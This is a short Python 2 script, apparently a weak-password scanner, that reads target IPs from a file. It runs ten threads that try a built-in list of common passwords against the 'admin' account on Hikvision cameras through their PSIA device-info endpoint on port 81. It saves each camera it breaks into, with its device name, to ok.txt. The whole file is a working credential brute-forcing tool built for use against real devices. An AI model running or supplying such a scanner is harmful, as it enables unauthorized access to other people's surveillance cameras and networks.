#!/usr/bin/env python
# encoding: utf-8

"""
@version: ??
@author: hiro086
@contact: wangzw@nuaa.edu.cn
@file: weak_password.py
@time: 17/6/29 上午10:15
"""
import threading
import requests
import Queue
import sys
import re

password = ['admin','12345','123456','123456789','password','iloveyou','princess','rockyou','1234567','12345678','abc123','111111','superman']
def Threads():
    threadlist = []
    queue = Queue.Queue()
    for ip in open('ip_list1.txt','r'):
        queue.put(ip.replace('\n',''))
    for x in range(0,10):
        th = threading.Thread(target=scan_Hikvision,args=(queue,))
        threadlist.append(th)
    for t in threadlist:
        t.start()
    for t in threadlist:
        t.join()

def scan_Hikvision(queue):
    while not queue.empty():
        ip = queue.get()
        for passwd in password:
            try:
                print "[*]scan:"+ip
                r = requests.get(url=("http://%s:81/PSIA/System/deviceInfo" % ip),auth=('admin',passwd),
                                 timeout=20)
                print "[*]back:"+ip+' '+passwd+' '+str(r.status_code)
                if r.status_code == 200:
                    deviceName = re.findall(r'<deviceName>(.+?)<deviceName>',r.text)[0]
                    f = open('ok.txt','a+')
                    f.write("ip:%s deviceName:%s\n" % (ip,deviceName))
                    f.close()
                    break
            except:
                continue

if __name__ == '__main__':
    print "Running scan_Hikvision ..."
    Threads()
